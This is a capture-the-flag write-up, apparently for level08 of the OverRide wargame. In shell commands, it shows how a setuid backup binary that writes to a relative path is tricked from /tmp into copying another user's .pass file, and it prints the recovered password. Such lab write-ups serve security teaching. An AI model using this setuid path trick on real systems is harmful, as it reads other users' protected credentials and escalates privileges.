```shell
$> ls -la
drwxrwx---+ 1 level09 users      60 Oct 19  2016 backups
[...]
-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08
[...]

$> ls -la backups
[...]
-rwxrwx---+ 1 level09 users     0 Oct 19  2016 .log
[...]

$> cat backups/.log

$> ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)

level08@OverRide:~$ ./level08 test
ERROR: Failed to open test

$> ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass

$> mkdir -p ./backups//home/users/level09/
mkdir: cannot create directory \`./backups//home\': Permission denied

# We can't create a directory in ./backups/ because of the permissions
# We try to create a directory in /tmp/

$> cd /tmp

$> mkdir -p ./backups//home/users/level09/

$> /home/users/level08/level08 /home/users/level09/.pass

$> cat backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

# ... easy ?
```

Analyze with ghidra and disassembler the code in GDB

```c
// check source.c file
```

```shell
# read source.c is better to understand the logic of the code
```